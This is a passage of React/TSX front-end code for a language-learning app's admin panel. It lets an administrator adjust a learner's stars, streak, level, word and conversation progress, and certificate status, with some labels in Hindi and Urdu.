                                  onClick={() => {
                                    const addVal = Math.max(
                                      0,
                                      Math.floor(Number(customStarsAddInput) || 0)
                                    );
                                    if (addVal <= 0) return;
                                    const nextStars = Math.min(
                                      100000,
                                      Number(targetLearnerForStars.stars || 0) +
                                        addVal
                                    );
                                    handleAdminBoostLearner(
                                      targetLearnerForStars,
                                      { stars: nextStars },
                                      `${targetLearnerForStars.displayName}: +${addVal} ⭐ (${nextStars} ⭐)`
                                    );
                                  }}
                                  className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-extrabold cursor-pointer whitespace-nowrap shadow-xs"
                                >
                                  + Add ⭐
                                </button>
                              </div>
                            </div>

                            {/* BOX 2: MINUS STARS (-) */}
                            <div
                              className={`p-3 rounded-xl border space-y-2 ${
                                isDark
                                  ? 'bg-rose-950/30 border-rose-500/40'
                                  : 'bg-white border-rose-300'
                              }`}
                            >
                              <label className="block text-[11px] font-extrabold text-rose-500 uppercase tracking-wider">
                                ➖ Box 2: Minus Stars (स्टार्स घटाएं / سٹارز مائنس کریں)
                              </label>
                              <div className="flex items-center gap-2">
                                <input
                                  type="number"
                                  min={1}
                                  max={100000}
                                  value={customStarsMinusInput}
                                  onChange={(e) =>
                                    setCustomStarsMinusInput(e.target.value)
                                  }
                                  onKeyDown={(e) => {
                                    if (e.key === 'Enter') {
                                      const subVal = Math.max(
                                        0,
                                        Math.floor(
                                          Number(customStarsMinusInput) || 0
                                        )
                                      );
                                      if (subVal <= 0) return;
                                      const nextStars = Math.max(
                                        0,
                                        Number(targetLearnerForStars.stars || 0) -
                                          subVal
                                      );
                                      handleAdminBoostLearner(
                                        targetLearnerForStars,
                                        { stars: nextStars },
                                        `${targetLearnerForStars.displayName}: -${subVal} ⭐ (${nextStars} ⭐)`
                                      );
                                    }
                                  }}
                                  placeholder="Enter stars to minus..."
                                  className={`flex-1 px-3 py-2 rounded-lg border text-xs font-mono font-bold outline-none ${
                                    isDark
                                      ? 'bg-slate-950 border-slate-700 text-rose-400 focus:border-rose-400'
                                      : 'bg-slate-50 border-slate-300 text-slate-900 focus:border-rose-500'
                                  }`}
                                />
                                <button
                                  type="button"
                                  onClick={() => {
                                    const subVal = Math.max(
                                      0,
                                      Math.floor(Number(customStarsMinusInput) || 0)
                                    );
                                    if (subVal <= 0) return;
                                    const nextStars = Math.max(
                                      0,
                                      Number(targetLearnerForStars.stars || 0) -
                                        subVal
                                    );
                                    handleAdminBoostLearner(
                                      targetLearnerForStars,
                                      { stars: nextStars },
                                      `${targetLearnerForStars.displayName}: -${subVal} ⭐ (${nextStars} ⭐)`
                                    );
                                  }}
                                  className="px-4 py-2 rounded-lg bg-rose-500 hover:bg-rose-400 text-white text-xs font-extrabold cursor-pointer whitespace-nowrap shadow-xs"
                                >
                                  - Minus ⭐
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      );
                    })()}
                  </div>

                  {/* 3. Search & Quick Add Learner Toolbar */}
                  <div
                    className={`p-3 rounded-xl border flex flex-col md:flex-row items-stretch md:items-center justify-between gap-2.5 ${
                      isDark
                        ? 'bg-slate-900/70 border-slate-800'
                        : 'bg-slate-50 border-slate-200'
                    }`}
                  >
                    {/* Search Input */}
                    <div className="relative flex-1">
                      <Search className="w-4 h-4 text-slate-400 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                      <input
                        type="text"
                        value={adminSearchQuery}
                        onChange={(e) => setAdminSearchQuery(e.target.value)}
                        placeholder={mt.searchProfilePlaceholder}
                        className={`w-full pr-9 pl-3 py-2 rounded-lg border text-xs font-medium transition-colors ${
                          isDark
                            ? 'bg-slate-950 border-slate-800 text-white placeholder:text-slate-500 focus:border-sky-500'
                            : 'bg-white border-slate-300 text-slate-900 placeholder:text-slate-400 focus:border-sky-500'
                        } outline-none`}
                      />
                    </div>

                    {/* Add New Learner Input + Button */}
                    <div className="flex items-center gap-2 md:w-auto">
                      <input
                        type="text"
                        value={newStudentNameInput}
                        onChange={(e) => setNewStudentNameInput(e.target.value)}
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') handleAddNewStudentProfile();
                        }}
                        placeholder={mt.newStudentPlaceholder}
                        className={`flex-1 md:w-56 px-3 py-2 rounded-lg border text-xs font-medium ${
                          isDark
                            ? 'bg-slate-950 border-slate-800 text-white placeholder:text-slate-500'
                            : 'bg-white border-slate-300 text-slate-900 placeholder:text-slate-400'
                        } outline-none`}
                      />
                      <button
                        type="button"
                        onClick={handleAddNewStudentProfile}
                        className="px-3.5 py-2 rounded-lg bg-slate-900 dark:bg-sky-500 hover:opacity-95 text-white dark:text-slate-950 text-xs font-bold flex items-center gap-1.5 cursor-pointer whitespace-nowrap shrink-0"
                      >
                        <UserPlus className="w-3.5 h-3.5" />
                        <span>{mt.addNewProfileBtn}</span>
                      </button>
                    </div>
                  </div>

                  {/* 4. Master-Detail Split Workspace: Left Directory Table (7 cols) + Right Profile Inspector (5 cols) */}
                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 items-start">
                    {/* LEFT PANE: All Learners High-Density Directory */}
                    <div
                      className={`lg:col-span-7 rounded-xl border overflow-hidden ${
                        isDark
                          ? 'bg-slate-900/90 border-slate-800'
                          : 'bg-white border-slate-200'
                      }`}
                    >
                      <div
                        className={`px-4 py-3 border-b flex items-center justify-between gap-2 ${
                          isDark
                            ? 'bg-slate-950/60 border-slate-800'
                            : 'bg-slate-50 border-slate-200'
                        }`}
                      >
                        <div className="flex items-center gap-2">
                          <span className="font-display font-bold text-xs sm:text-sm">
                            {mt.directoryHeader(filteredAdminLearners.length)}
                          </span>
                        </div>
                        <span className="text-[11px] text-slate-500 dark:text-slate-400">
                          {mt.directoryHint}
                        </span>
                      </div>

                      {loadingLearners ? (
                        <div className="p-8 text-center text-xs font-medium text-slate-500">
                          {mt.loadingProfilesText}
                        </div>
                      ) : filteredAdminLearners.length === 0 ? (
                        <div className="p-8 text-center text-xs text-slate-500">
                          {mt.noStudentFoundText}
                        </div>
                      ) : (
                        <div
                          className={`divide-y max-h-[460px] overflow-y-auto ${
                            isDark ? 'divide-slate-800' : 'divide-slate-200'
                          }`}
                        >
                          {filteredAdminLearners.map((item) => {
                            const isSelected =
                              selectedLearnerRecord?.uid === item.uid;
                            const levelNum = getLearnerNumericLevel(item);
                            const initials = item.displayName
                              .trim()
                              .slice(0, 2)
                              .toUpperCase();

                            return (
                              <div
                                key={item.uid}
                                onClick={() => handleSelectLearnerProfile(item)}
                                className={`px-3.5 py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 transition-colors cursor-pointer select-none ${
                                  isSelected
                                    ? isDark
                                      ? 'bg-sky-950/35 border-s-4 border-s-sky-400'
                                      : 'bg-sky-50/80 border-s-4 border-s-sky-600'
                                    : isDark
                                    ? 'hover:bg-slate-800/60'
                                    : 'hover:bg-slate-50'
                                }`}
                              >
                                {/* Left: Avatar + Name + Unboxed Metadata */}
                                <div className="flex items-center gap-3 min-w-0 flex-1">
                                  <div
                                    className={`w-9 h-9 rounded-lg font-display font-bold text-xs flex items-center justify-center shrink-0 border ${
                                      isSelected
                                        ? 'bg-sky-500 text-slate-950 border-sky-400'
                                        : isDark
                                        ? 'bg-slate-800 text-slate-300 border-slate-700'
                                        : 'bg-slate-100 text-slate-700 border-slate-200'
                                    }`}
                                  >
                                    {initials}
                                  </div>

                                  <div className="min-w-0 flex-1">
                                    <div className="flex items-center gap-2">
                                      <span className="font-display font-bold text-xs sm:text-sm truncate">
                                        {item.displayName}
                                      </span>
                                      <span
                                        className={`inline-flex items-center gap-1 text-[11px] font-semibold ${
                                          levelNum === 4
                                            ? 'text-emerald-500'
                                            : levelNum === 3
                                            ? 'text-rose-500'
                                            : levelNum === 2
                                            ? 'text-amber-500'
                                            : 'text-sky-500'
                                        }`}
                                      >
                                        <span
                                          className={`w-1.5 h-1.5 rounded-full ${
                                            levelNum === 4
                                              ? 'bg-emerald-500'
                                              : levelNum === 3
                                              ? 'bg-rose-500'
                                              : levelNum === 2
                                              ? 'bg-amber-500'
                                              : 'bg-sky-500'
                                          }`}
                                        />
                                        <span>{mt.levelShortLabel(levelNum)}</span>
                                      </span>
                                    </div>

                                    <div className="text-[11px] text-slate-500 dark:text-slate-400 truncate mt-0.5 flex flex-wrap items-center gap-1.5">
                                      <span>
                                        {item.nativeLangName} → {item.targetLangName}
                                      </span>
                                      <span>·</span>
                                      <span
                                        className="font-mono font-bold text-emerald-500"
                                        style={{
                                          fontVariantNumeric: 'tabular-nums',
                                        }}
                                      >
                                        🍎 {item.wordsCompleted}/{item.wordsTotal}
                                      </span>
                                      <span>·</span>
                                      <span
                                        className="font-mono font-bold text-purple-400"
                                        style={{
                                          fontVariantNumeric: 'tabular-nums',
                                        }}
                                      >
                                        💬 {item.conversationsCompleted}/{item.conversationsTotal}
                                      </span>
                                      <span>·</span>
                                      <span
                                        style={{
                                          fontVariantNumeric: 'tabular-nums',
                                        }}
                                      >
                                        {mt.starsCountLabel(item.stars)}
                                      </span>
                                    </div>
                                  </div>
                                </div>

                                {/* Right: Clean Tabular Steppers for Words, Conversation Rounds, Streak & Level */}
                                <div
                                  className="flex flex-wrap items-center gap-1.5 shrink-0"
                                  onClick={(e) => e.stopPropagation()}
                                >
                                  {/* Compact Words Stepper + 100% Complete Button */}
                                  <div
                                    className={`inline-flex items-center rounded-lg border p-0.5 ${
                                      isDark
                                        ? 'bg-slate-950 border-slate-800'
                                        : 'bg-slate-50 border-slate-200'
                                    }`}
                                    title="Words Completed"
                                  >
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          item,
                                          {
                                            wordsCompleted: Math.max(
                                              0,
                                              item.wordsCompleted - 1
                                            ),
                                          },
                                          `🍎 ${item.displayName}: ${Math.max(0, item.wordsCompleted - 1)}/${item.wordsTotal} Words`
                                        )
                                      }
                                      className="w-5 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                    >
                                      <Minus className="w-3 h-3" />
                                    </button>
                                    <span
                                      className="px-1.5 text-[11px] font-mono font-bold text-emerald-500"
                                      style={{
                                        fontVariantNumeric: 'tabular-nums',
                                      }}
                                    >
                                      🍎{item.wordsCompleted}
                                    </span>
                                    <button
                                      type="button"
                                      onClick={() => {
                                        const nextW = Math.min(
                                          item.wordsTotal,
                                          item.wordsCompleted + 1
                                        );
                                        handleAdminBoostLearner(
                                          item,
                                          { wordsCompleted: nextW },
                                          `🍎 ${item.displayName}: ${nextW}/${item.wordsTotal} Words`
                                        );
                                      }}
                                      className="w-5 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                    >
                                      <Plus className="w-3 h-3" />
                                    </button>
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          item,
                                          {
                                            wordsCompleted: item.wordsTotal,
                                          },
                                          `✅ ${item.displayName}: All ${item.wordsTotal}/${item.wordsTotal} Words Completed!`
                                        )
                                      }
                                      title="Complete All Words (100%)"
                                      className="px-1.5 h-6 rounded-md bg-emerald-500/20 hover:bg-emerald-500/35 text-emerald-400 text-[10px] font-extrabold cursor-pointer"
                                    >
                                      100%
                                    </button>
                                  </div>

                                  {/* Compact Conversation Rounds Stepper + 100% Complete Button */}
                                  <div
                                    className={`inline-flex items-center rounded-lg border p-0.5 ${
                                      isDark
                                        ? 'bg-slate-950 border-slate-800'
                                        : 'bg-slate-50 border-slate-200'
                                    }`}
                                    title="Conversation Rounds Completed"
                                  >
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          item,
                                          {
                                            conversationsCompleted: Math.max(
                                              0,
                                              item.conversationsCompleted - 1
                                            ),
                                          },
                                          `💬 ${item.displayName}: ${Math.max(0, item.conversationsCompleted - 1)}/${item.conversationsTotal} Rounds`
                                        )
                                      }
                                      className="w-5 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                    >
                                      <Minus className="w-3 h-3" />
                                    </button>
                                    <span
                                      className="px-1.5 text-[11px] font-mono font-bold text-purple-400"
                                      style={{
                                        fontVariantNumeric: 'tabular-nums',
                                      }}
                                    >
                                      💬{item.conversationsCompleted}
                                    </span>
                                    <button
                                      type="button"
                                      onClick={() => {
                                        const nextC = Math.min(
                                          item.conversationsTotal,
                                          item.conversationsCompleted + 1
                                        );
                                        handleAdminBoostLearner(
                                          item,
                                          { conversationsCompleted: nextC },
                                          `💬 ${item.displayName}: ${nextC}/${item.conversationsTotal} Rounds`
                                        );
                                      }}
                                      className="w-5 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                    >
                                      <Plus className="w-3 h-3" />
                                    </button>
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          item,
                                          {
                                            conversationsCompleted:
                                              item.conversationsTotal,
                                          },
                                          `✅ ${item.displayName}: All ${item.conversationsTotal}/${item.conversationsTotal} Conversation Rounds Completed!`
                                        )
                                      }
                                      title="Complete All Conversation Rounds (100%)"
                                      className="px-1.5 h-6 rounded-md bg-purple-500/20 hover:bg-purple-500/35 text-purple-300 text-[10px] font-extrabold cursor-pointer"
                                    >
                                      100%
                                    </button>
                                  </div>

                                  {/* Compact Streak Stepper */}
                                  <div
                                    className={`inline-flex items-center rounded-lg border p-0.5 ${
                                      isDark
                                        ? 'bg-slate-950 border-slate-800'
                                        : 'bg-slate-50 border-slate-200'
                                    }`}
                                  >
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          item,
                                          {
                                            streakDays: Math.max(
                                              0,
                                              item.streakDays - 1
                                            ),
                                          },
                                          `${item.displayName}: ${Math.max(0, item.streakDays - 1)}d`
                                        )
                                      }
                                      className="w-6 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                      title={mt.decreaseBtn}
                                    >
                                      <Minus className="w-3 h-3" />
                                    </button>
                                    <span
                                      className="px-2 text-xs font-mono font-bold text-amber-500"
                                      style={{
                                        fontVariantNumeric: 'tabular-nums',
                                      }}
                                    >
                                      {item.streakDays}d
                                    </span>
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          item,
                                          { streakDays: item.streakDays + 1 },
                                          `${item.displayName}: ${item.streakDays + 1}d`
                                        )
                                      }
                                      className="w-6 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                      title={mt.increaseBtn}
                                    >
                                      <Plus className="w-3 h-3" />
                                    </button>
                                  </div>

                                  {/* Compact Level Stepper */}
                                  <div
                                    className={`inline-flex items-center rounded-lg border p-0.5 ${
                                      isDark
                                        ? 'bg-slate-950 border-slate-800'
                                        : 'bg-slate-50 border-slate-200'
                                    }`}
                                  >
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleStepLearnerLevel(item, 'down')
                                      }
                                      disabled={levelNum <= 1}
                                      className="w-6 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 disabled:opacity-30 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                      title={mt.levelDownBtn}
                                    >
                                      <ChevronDown className="w-3.5 h-3.5" />
                                    </button>
                                    <span
                                      className="px-2 text-xs font-mono font-bold text-sky-500"
                                      style={{
                                        fontVariantNumeric: 'tabular-nums',
                                      }}
                                    >
                                      L{levelNum}
                                    </span>
                                    <button
                                      type="button"
                                      onClick={() =>
                                        handleStepLearnerLevel(item, 'up')
                                      }
                                      disabled={levelNum >= 4}
                                      className="w-6 h-6 rounded-md hover:bg-slate-200 dark:hover:bg-slate-800 disabled:opacity-30 flex items-center justify-center text-slate-500 dark:text-slate-300 cursor-pointer"
                                      title={mt.levelUpBtn}
                                    >
                                      <ChevronUp className="w-3.5 h-3.5" />
                                    </button>
                                  </div>
                                </div>
                              </div>
                            );
                          })}
                        </div>
                      )}
                    </div>

                    {/* RIGHT PANE: Selected Learner Profile Inspector Drawer */}
                    <div
                      className={`lg:col-span-5 rounded-xl border overflow-hidden ${
                        isDark
                          ? 'bg-slate-900/90 border-slate-800'
                          : 'bg-white border-slate-200'
                      }`}
                    >
                      {selectedLearnerRecord ? (
                        (() => {
                          const activeItem = selectedLearnerRecord;
                          const activeLevelNum =
                            getLearnerNumericLevel(activeItem);
                          const activeInitials = activeItem.displayName
                            .trim()
                            .slice(0, 2)
                            .toUpperCase();

                          return (
                            <div className="divide-y divide-slate-200 dark:divide-slate-800">
                              {/* Inspector Header: Selected Profile Summary */}
                              <div
                                className={`p-4 flex items-start justify-between gap-3 ${
                                  isDark ? 'bg-slate-950/60' : 'bg-slate-50'
                                }`}
                              >
                                <div className="flex items-center gap-3 min-w-0">
                                  <div className="w-11 h-11 rounded-xl bg-sky-500 text-slate-950 font-display font-bold text-sm flex items-center justify-center shrink-0">
                                    {activeInitials}
                                  </div>
                                  <div className="min-w-0">
                                    <div className="text-[11px] font-mono uppercase tracking-wider text-sky-500">
                                      {mt.selectedProfileInspectorTag}
                                    </div>
                                    <h5 className="font-display font-bold text-sm sm:text-base truncate">
                                      {activeItem.displayName}
                                    </h5>
                                    <p className="text-xs text-slate-500 dark:text-slate-400 truncate">
                                      {activeItem.nativeLangName} →{' '}
                                      {activeItem.targetLangName} ·{' '}
                                      {mt.lastActiveLabel}{' '}
                                      {activeItem.lastActiveDate}
                                    </p>
                                  </div>
                                </div>

                                <button
                                  type="button"
                                  onClick={() =>
                                    generateAndDownloadCertificatePdf({
                                      name: activeItem.displayName,
                                      nativeCode: activeItem.nativeLangCode,
                                      targetCode: activeItem.targetLangCode,
                                      completedDate: activeItem.lastActiveDate,
                                    })
                                  }
                                  className="px-2.5 py-1.5 rounded-lg border border-slate-300 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-800 text-xs font-semibold flex items-center gap-1.5 cursor-pointer whitespace-nowrap shrink-0"
                                  title={mt.downloadStudentCertTitle}
                                >
                                  <Download className="w-3.5 h-3.5 text-sky-500" />
                                  <span>{mt.pdfCertBtn}</span>
                                </button>
                              </div>

                              {/* Control Block 1: Streak Decrease [-] & Increase [+] */}
                              <div className="p-4 space-y-3">
                                <div className="flex items-center justify-between">
                                  <span className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 flex items-center gap-1.5">
                                    <Flame className="w-3.5 h-3.5 text-amber-500" />
                                    <span>{mt.streakControlTitle}</span>
                                  </span>
                                  <span
                                    className="text-xs font-mono font-semibold text-slate-500 dark:text-slate-400"
                                    style={{
                                      fontVariantNumeric: 'tabular-nums',
                                    }}
                                  >
                                    {mt.targetDaysShort(
                                      activeItem.streakGoalDays
                                    )}
                                  </span>
                                </div>

                                {/* Primary [-1] [Readout] [+1] Bar */}
                                <div
                                  className={`p-2.5 rounded-xl border flex items-center justify-between gap-2 ${
                                    isDark
                                      ? 'bg-slate-950 border-slate-800'
                                      : 'bg-slate-50 border-slate-200'
                                  }`}
                                >
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          streakDays: Math.max(
                                            0,
                                            activeItem.streakDays - 1
                                          ),
                                        },
                                        `${activeItem.displayName}: ${Math.max(0, activeItem.streakDays - 1)}d`
                                      )
                                    }
                                    className="px-3 py-2 rounded-lg bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 text-rose-500 text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <Minus className="w-3.5 h-3.5" />
                                    <span>{mt.decreaseBtn}</span>
                                  </button>

                                  <div className="text-center">
                                    <div
                                      className="font-mono font-bold text-2xl text-amber-500 leading-none"
                                      style={{
                                        fontVariantNumeric: 'tabular-nums',
                                      }}
                                    >
                                      {activeItem.streakDays}
                                    </div>
                                    <div className="text-[10px] text-slate-500 dark:text-slate-400 mt-1">
                                      {mt.daysStreakLabel}
                                    </div>
                                  </div>

                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          streakDays: activeItem.streakDays + 1,
                                        },
                                        `${activeItem.displayName}: ${activeItem.streakDays + 1}d`
                                      )
                                    }
                                    className="px-3 py-2 rounded-lg bg-amber-500 hover:bg-amber-400 text-slate-950 text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <Plus className="w-3.5 h-3.5" />
                                    <span>{mt.increaseBtn}</span>
                                  </button>
                                </div>

                                {/* Quick Preset Increments/Decrements */}
                                <div className="grid grid-cols-3 sm:grid-cols-6 gap-1.5">
                                  {[
                                    {
                                      label: 'Reset 0',
                                      nextVal: 0,
                                      isDanger: true,
                                    },
                                    {
                                      label: '-5d',
                                      nextVal: Math.max(
                                        0,
                                        activeItem.streakDays - 5
                                      ),
                                      isDanger: true,
                                    },
                                    {
                                      label: '+3d',
                                      nextVal: activeItem.streakDays + 3,
                                      isDanger: false,
                                    },
                                    {
                                      label: '+5d',
                                      nextVal: activeItem.streakDays + 5,
                                      isDanger: false,
                                    },
                                    {
                                      label: '+7d',
                                      nextVal: activeItem.streakDays + 7,
                                      isDanger: false,
                                    },
                                    {
                                      label: '+30d',
                                      nextVal: activeItem.streakDays + 30,
                                      isDanger: false,
                                    },
                                  ].map((preset) => (
                                    <button
                                      key={preset.label}
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          activeItem,
                                          { streakDays: preset.nextVal },
                                          `${activeItem.displayName}: ${preset.nextVal}d`
                                        )
                                      }
                                      className={`py-1.5 px-2 rounded-lg border text-[11px] font-mono font-semibold cursor-pointer whitespace-nowrap ${
                                        preset.isDanger
                                          ? 'border-rose-500/30 text-rose-500 hover:bg-rose-500/10'
                                          : isDark
                                          ? 'border-slate-800 bg-slate-950 text-slate-300 hover:border-amber-500/50'
                                          : 'border-slate-200 bg-slate-50 text-slate-700 hover:border-amber-500'
                                      }`}
                                    >
                                      {preset.label}
                                    </button>
                                  ))}
                                </div>

                                {/* Custom Numeric Input Row */}
                                <div className="flex items-end gap-2 pt-1">
                                  <div className="flex-1">
                                    <label className="block text-[10px] text-slate-500 dark:text-slate-400 mb-1">
                                      {mt.customStreakInputAdmin}
                                    </label>
                                    <input
                                      type="number"
                                      min={0}
                                      max={3650}
                                      value={profileCustomStreak}
                                      onChange={(e) =>
                                        setProfileCustomStreak(
                                          Math.max(
                                            0,
                                            Number(e.target.value) || 0
                                          )
                                        )
                                      }
                                      className={`w-full px-2.5 py-1.5 rounded-lg border text-xs font-mono font-bold ${
                                        isDark
                                          ? 'bg-slate-950 border-slate-800 text-white'
                                          : 'bg-slate-50 border-slate-300 text-slate-900'
                                      }`}
                                    />
                                  </div>
                                  <div className="flex-1">
                                    <label className="block text-[10px] text-slate-500 dark:text-slate-400 mb-1">
                                      {mt.goalDaysInputAdmin}
                                    </label>
                                    <input
                                      type="number"
                                      min={1}
                                      max={365}
                                      value={profileCustomGoal}
                                      onChange={(e) =>
                                        setProfileCustomGoal(
                                          Math.max(
                                            1,
                                            Number(e.target.value) || 7
                                          )
                                        )
                                      }
                                      className={`w-full px-2.5 py-1.5 rounded-lg border text-xs font-mono font-bold ${
                                        isDark
                                          ? 'bg-slate-950 border-slate-800 text-white'
                                          : 'bg-slate-50 border-slate-300 text-slate-900'
                                      }`}
                                    />
                                  </div>
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          streakDays: profileCustomStreak,
                                          streakGoalDays: profileCustomGoal,
                                        },
                                        `${activeItem.displayName}: ${profileCustomStreak}/${profileCustomGoal}d`
                                      )
                                    }
                                    className="px-3.5 py-1.5 rounded-lg bg-slate-900 dark:bg-slate-100 text-white dark:text-slate-900 text-xs font-bold cursor-pointer whitespace-nowrap"
                                  >
                                    {mt.applyBtn}
                                  </button>
                                </div>
                              </div>

                              {/* Control Block 2: Level Decrease [-] & Increase [+] */}
                              <div className="p-4 space-y-3">
                                <div className="flex items-center justify-between">
                                  <span className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 flex items-center gap-1.5">
                                    <Trophy className="w-3.5 h-3.5 text-sky-500" />
                                    <span>{mt.levelControlTitle}</span>
                                  </span>
                                  <span
                                    className="text-xs font-mono font-semibold text-sky-500"
                                    style={{
                                      fontVariantNumeric: 'tabular-nums',
                                    }}
                                  >
                                    {mt.levelShortLabel(activeLevelNum)} / 4
                                  </span>
                                </div>

                                {/* Primary [Level Down] [Current Level] [Level Up] Bar */}
                                <div
                                  className={`p-2.5 rounded-xl border flex items-center justify-between gap-2 ${
                                    isDark
                                      ? 'bg-slate-950 border-slate-800'
                                      : 'bg-slate-50 border-slate-200'
                                  }`}
                                >
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleStepLearnerLevel(activeItem, 'down')
                                    }
                                    disabled={activeLevelNum <= 1}
                                    className="px-3 py-2 rounded-lg bg-rose-500/15 hover:bg-rose-500/25 disabled:opacity-35 border border-rose-500/30 text-rose-500 text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <ChevronDown className="w-3.5 h-3.5" />
                                    <span>{mt.levelDownBtn}</span>
                                  </button>

                                  <div className="text-center px-1">
                                    <div className="font-display font-bold text-sm sm:text-base text-sky-500">
                                      {mt.levelShortLabel(activeLevelNum)}
                                    </div>
                                    <div className="text-[11px] text-slate-500 dark:text-slate-400">
                                      {activeLevelNum === 1
                                        ? `Easy · ${mt.stageSub1}`
                                        : activeLevelNum === 2
                                        ? `Medium · ${mt.stageSub2}`
                                        : activeLevelNum === 3
                                        ? `Hard · ${mt.stageSub3}`
                                        : mt.stageSub4}
                                    </div>
                                  </div>

                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleStepLearnerLevel(activeItem, 'up')
                                    }
                                    disabled={activeLevelNum >= 4}
                                    className="px-3 py-2 rounded-lg bg-sky-500 hover:bg-sky-400 disabled:opacity-35 text-slate-950 text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <ChevronUp className="w-3.5 h-3.5" />
                                    <span>{mt.levelUpBtn}</span>
                                  </button>
                                </div>

                                {/* Direct 4-Stage Segmented Selector */}
                                <div className="grid grid-cols-2 gap-1.5">
                                  {[
                                    {
                                      num: 1,
                                      title: 'Level 1: Easy',
                                      sub: mt.stageSub1,
                                      diff: 'easy' as DifficultyLevel,
                                      stage: 'ALPHABET_GAME' as const,
                                      cert: false,
                                    },
                                    {
                                      num: 2,
                                      title: 'Level 2: Medium',
                                      sub: mt.stageSub2,
                                      diff: 'medium' as DifficultyLevel,
                                      stage: 'WORDS_GAME' as const,
                                      cert: false,
                                    },
                                    {
                                      num: 3,
                                      title: 'Level 3: Hard',
                                      sub: mt.stageSub3,
                                      diff: 'hard' as DifficultyLevel,
                                      stage: 'CONVERSATION_GAME' as const,
                                      cert: false,
                                    },
                                    {
                                      num: 4,
                                      title: 'Level 4: Completed',
                                      sub: mt.stageSub4,
                                      diff: 'hard' as DifficultyLevel,
                                      stage: 'COMPLETED' as const,
                                      cert: true,
                                    },
                                  ].map((lvl) => (
                                    <button
                                      key={lvl.num}
                                      type="button"
                                      onClick={() =>
                                        handleAdminBoostLearner(
                                          activeItem,
                                          {
                                            difficultyLevel: lvl.diff,
                                            currentStage: lvl.stage,
                                            certificateEarned: lvl.cert,
                                          },
                                          `${activeItem.displayName}: ${lvl.title}`
                                        )
                                      }
                                      className={`p-2 rounded-lg border text-start transition-colors cursor-pointer ${
                                        activeLevelNum === lvl.num
                                          ? 'bg-sky-500/15 border-sky-500 text-sky-500'
                                          : isDark
                                          ? 'bg-slate-950 border-slate-800 text-slate-300 hover:border-slate-700'
                                          : 'bg-slate-50 border-slate-200 text-slate-700 hover:border-slate-300'
                                      }`}
                                    >
                                      <div className="text-xs font-bold">
                                        {lvl.title}
                                      </div>
                                      <div className="text-[10px] opacity-75">
                                        {lvl.sub}
                                      </div>
                                    </button>
                                  ))}
                                </div>

                                {/* One-Click Full Course + Words + Conversation Completion Button */}
                                <button
                                  type="button"
                                  onClick={() =>
                                    handleAdminBoostLearner(
                                      activeItem,
                                      {
                                        wordsCompleted: activeItem.wordsTotal,
                                        conversationsCompleted:
                                          activeItem.conversationsTotal,
                                        alphabetsCompleted:
                                          activeItem.alphabetsTotal,
                                        difficultyLevel: 'hard',
                                        currentStage: 'COMPLETED',
                                        certificateEarned: true,
                                      },
                                      `🎓 ${activeItem.displayName}: 100% Words + Conversation Rounds + Level 4 Completed!`
                                    )
                                  }
                                  className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-emerald-500 via-teal-500 to-sky-500 hover:brightness-105 text-slate-950 font-display font-extrabold text-xs shadow-sm flex items-center justify-center gap-1.5 cursor-pointer"
                                >
                                  <CheckCircle2 className="w-4 h-4 stroke-[2.5]" />
                                  <span>
                                    🎓 Complete All Words + Conversation Rounds + Level 4 (100%)
                                  </span>
                                </button>
                              </div>

                              {/* Control Block 3: Words Progress (الفاظ مکمل کریں / بڑھا ئیں) */}
                              <div className="p-4 space-y-3">
                                <div className="flex items-center justify-between">
                                  <span className="text-xs font-bold uppercase tracking-wider text-emerald-500 flex items-center gap-1.5">
                                    <span>🍎 Words Progress (الفاظ کی تعداد)</span>
                                  </span>
                                  <span
                                    className="text-xs font-mono font-extrabold text-emerald-500"
                                    style={{
                                      fontVariantNumeric: 'tabular-nums',
                                    }}
